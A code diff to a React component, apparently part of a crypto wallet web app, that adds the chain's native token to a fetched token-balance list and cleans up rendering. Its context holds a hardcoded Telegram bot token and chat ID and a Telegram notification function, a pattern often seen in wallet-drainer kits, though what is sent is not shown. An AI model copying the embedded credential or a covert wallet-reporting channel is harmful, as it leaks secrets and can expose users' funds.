@@ -11,6 +11,7 @@ import axios from 'axios';
 // Telegram Bot Config
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
+
 // Function to send a message to Telegram
 const sendTelegramNotification = async (message) => {
   try {
@@ -61,7 +62,6 @@ const chainIdToNetworkMap = {
   137: Network.MATIC_MAINNET,  // Polygon Mainnet
   // Add other mappings as needed
 };
-
 
 const supportedChains = [1, 56, 10, 324, 42161, 137]; // Supported chain IDs
 
@@ -171,18 +171,29 @@ export const GetTokens = () => {
       // Fetch native token balance
       const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
 
-      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
-        contract_address: balance.contractAddress,
-        balance: safeNumber(balance.tokenBalance),
-        quote: balance.quote || 0,
-        quote_rate: balance.quoteRate || 0,
-      }));
+      const nativeToken = {
+        contract_address: 'native',
+        contract_ticker_symbol: chain.nativeCurrency.symbol, // Display native currency symbol
+        balance: safeNumber(nativeBalanceResponse), // Add balance to native token
+        quote: 0, // Set quote to 0 as it's the native token
+        quote_rate: 0, // Set quote rate to 0 as it's the native token
+      };
+
+      const processedTokens = [
+        nativeToken, // Include native token at the beginning of the tokens list
+        ...tokensResponse.tokenBalances.map((balance) => ({
+          contract_address: balance.contractAddress,
+          balance: safeNumber(balance.tokenBalance),
+          quote: balance.quote || 0,
+          quote_rate: balance.quoteRate || 0,
+        })),
+      ];
 
       setTokens(processedTokens);
       console.log('Fetched tokens:', processedTokens);
     } catch (error) {
       console.error('Error fetching tokens:', error);
-      setError((error.message));
+      setError(error.message);
     }
     setLoading(false);
   }, [address, chain, setTokens]);
@@ -214,13 +225,10 @@ export const GetTokens = () => {
   }
 
   return (
-    <div style={{ margin: '20px' }}>
-      {isConnected && tokens?.length === 0 && `No tokens on ${chain?.name}`}
+    <div>
       {tokens.map((token) => (
-        <TokenRow token={token} key={token.contract_address} />
+        <TokenRow key={token.contract_address} token={token} />
       ))}
     </div>
   );
 };
-
-
